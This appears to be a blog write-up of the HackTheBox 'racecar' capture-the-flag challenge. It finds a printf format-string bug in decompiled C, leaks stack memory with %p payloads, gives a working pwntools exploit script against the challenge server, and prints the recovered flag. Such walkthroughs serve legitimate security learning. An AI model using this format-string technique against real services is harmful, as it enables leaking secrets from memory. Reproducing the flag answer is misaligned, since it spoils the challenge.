---
layout: post
title: Binary Exploitation&#58; HacktheBox/racecar
---

## HacktheBox racecar Write-up

First we check the file type.
```
└─$ file racecar 
racecar: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=c5631a370f7704c44312f6692e1da56c25c1863c, not stripped
```

And the securities.
```
└─$ checksec --file=racecar             
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   96 Symbols	  No	0		3		racecar
```

Full RELRO, Canary, NX, and PIE. Seeing as this is an easy challenge, I am going to assume shell injection and buffer overflows are off the table.

### Reversing

Our vulnerability lies in the ```car_menu()``` function.
```c
    __format = (char *)malloc(0x171);
    __stream = fopen("flag.txt","r");
    if (__stream == (FILE *)0x0) {
      printf("%s[-] Could not open flag.txt. Please contact the creator.\n",&DAT_00011548,puVar5);
                    /* WARNING: Subroutine does not return */
      exit(0x69);
    }
    fgets(local_3c,0x2c,__stream);
    read(0,__format,0x170);
    puts(
        "\n\x1b[3mThe Man, the Myth, the Legend! The grand winner of the race wants the whole world  to know this: \x1b[0m"
        );
    printf(__format);
  }
```

Our flag is read into a ```char``` array on the stack, and we are prompted for our "Message to the press". Problem is, our input is used as the format string for a ```printf``` function. We can leverage this vulnerability to read arbitrary memory off the stack, and in our case, the flag.

### Pwn

To start, we need to find out what the offset of the flag is from the output of the ```printf()``` function. To do this, we can create our own ```flag.txt``` and input a value that will be easily identified.
```
python -c 'print b"\xef\xbe\xad\xde"' > flag.txt
```

Now just run the program again like we did before.
```
[!] Do you have anything to say to the press after your big victory?
> %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p 

The Man, the Myth, the Legend! The grand winner of the race wants the whole world to know this: 
0x584e7200 0x170 0x565b8dfa 0x2f 0x8 0x26 0x2 0x1 0x565b996c 0x584e7200 0x584e7380 0xdeadbeef 0xf7f4000a 0xf7d22e45 0xa6989400 0x565b9d58 0x565bbf8c 0xffd1bd08 0x565b938d 0x565b9540
```

Now we know that our flag starts at offset 12. We can use this information to get a list of hex value from the remote server, and knowing that the flag starts at offset 12, we can hopefully find where the flag ends.
```
└─$ python exploit_test.py
[+] Opening connection to 157.245.32.12 on port 31587: Done
/home/jake/Desktop/HTB/Challenges/racecar/exploit_test.py:9: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  r.recvuntil("Name: ")
/home/jake/Desktop/HTB/Challenges/racecar/exploit_test.py:11: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  r.recvuntil("Nickname: ")
/home/jake/Desktop/HTB/Challenges/racecar/exploit_test.py:15: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  r.recvuntil("> ")
/home/jake/Desktop/HTB/Challenges/racecar/exploit_test.py:17: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  r.recvuntil("> ")
/home/jake/Desktop/HTB/Challenges/racecar/exploit_test.py:19: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  r.recvuntil("> ")
/home/jake/Desktop/HTB/Challenges/racecar/exploit_test.py:21: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  r.recvuntil("> ")
[b'0x56e6c1c0', b'0x170', b'0x56558dfa', b'0x4f', b'0x8', b'0x26', b'0x2', b'0x1', b'0x5655996c', b'0x56e6c1c0', b'0x56e6c340', b'0x7b425448', b'0x5f796877', b'0x5f643164', b'0x34735f31', b'0x745f3376', b'0x665f3368', b'0x5f67346c', b'0x745f6e30', b'0x355f3368', b'0x6b633474', b'0x7d213f', b'0x4c084500', b'0xf7ee63fc', b'0x5655bf8c', b'0xffc1c568', b'0x56559441', b'0x1', b'0xffc1c614', b'0xffc1c61c', b'0x4c084500', b'0xffc1c580', b'(nil)', b'(nil)', b'0xf7d29f21', b'0xf7ee6000', b'0xf7ee6000', b'(nil)', b'0xf7d29f21', b'0x1', b'0xffc1c614', b'0xffc1c61c', b'0xffc1c5a4', b'0x1', b'0xffc1c614', b'0xf7ee6000', b'0xf7f0470a', b'0xffc1c610', b'(nil)', b'0xf7ee6000', b'\n']
[*] Closed connection to 157.245.32.12 port 31587
```

Now we can just use an online hex-to-ascii converter to find where the flag ends. After doing this, we will see that the final offset for the flag is 21.

Time to craft an exploit.
```python
#!/usr/bin/env python3

from pwn import *

payload = b"%p " * 50

r = remote("209.97.134.177", 31378)

r.recvuntil("Name: ")
r.sendline(b"asdf")
r.recvuntil("Nickname: ")
r.sendline(b"asdf")
r.recvuntil(b"> ")
r.sendline(b"1")
r.recvuntil("> ")
r.sendline(b"2")
r.recvuntil("> ")
r.sendline(b"2")
r.recvuntil("> ")
r.sendline(b"1")
r.recvuntil("> ")

r.sendline(payload)
r.recvline()
r.recvline()

result = r.recvline().split(b" ")
# print(result)

# Need index 11-21 and convert it from hex to ascii
flag = ""

for i in range(11, 22):
    tmp = str(result[i][2:].decode())
    flag += bytearray.fromhex(tmp).decode()[::-1]

print(flag)
```

The exploit recieves the string, splits it into an array, then loops through the indecies we need. Once each element we need from the list is striped, converted, and reversed order we append it to the flag and print it out.
```
└─$ python exploit.py     
[+] Opening connection to 157.245.32.12 on port 31587: Done
/home/jake/Desktop/HTB/Challenges/racecar/exploit.py:9: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  r.recvuntil("Name: ")
/home/jake/Desktop/HTB/Challenges/racecar/exploit.py:11: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  r.recvuntil("Nickname: ")
/home/jake/Desktop/HTB/Challenges/racecar/exploit.py:15: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  r.recvuntil("> ")
/home/jake/Desktop/HTB/Challenges/racecar/exploit.py:17: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  r.recvuntil("> ")
/home/jake/Desktop/HTB/Challenges/racecar/exploit.py:19: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  r.recvuntil("> ")
/home/jake/Desktop/HTB/Challenges/racecar/exploit.py:21: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  r.recvuntil("> ")
HTB{why_d1d_1_s4v3_th3_fl4g_0n_th3_5t4ck?!}
[*] Closed connection to 157.245.32.12 port 31587
```

Et Voila!
